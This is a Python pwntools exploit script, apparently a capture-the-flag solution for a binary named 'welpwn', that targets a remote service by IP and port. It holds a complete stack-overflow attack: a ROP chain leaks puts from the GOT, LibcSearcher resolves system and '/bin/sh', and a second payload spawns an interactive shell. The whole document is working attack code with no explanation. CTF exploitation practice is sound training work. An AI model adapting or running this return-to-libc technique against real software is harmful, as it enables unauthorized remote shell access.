from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
elf = ELF('./welpwn')
sh = elf.process()
sh = remote('111.198.29.45', 56891)
print hex(elf.got['puts'])
pop_6 = 0x40089a
pop_4 = 0x40089c
pop_rdi = 0x04008a3
main = 0x4007cd


payload_1 = 'A' * 0x18
payload_1 += p64(pop_4) + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main)
sh.sendline(payload_1)

sh.recvuntil("\x40")
libc_puts = u64(sh.recv()[0:6] + '\x00\x00')
print 'libc_puts' + hex(libc_puts)
libc = LibcSearcher("puts", libc_puts)
libc_base = libc_puts - libc.dump('puts')
libc_sys = libc_base + libc.dump('system')
libc_sh = libc_base + libc.dump('str_bin_sh')
print 'libc_base: ' + hex(libc_base)

payload_2 = 'A' * 0x18
payload_2 += p64(pop_4)
payload_2 += p64(pop_rdi)
payload_2 += p64(libc_sh)
payload_2 += p64(libc_sys)
payload_2 += p64(main)

#gdb.attach(sh)
sh.sendline(payload_2)

sh.interactive()
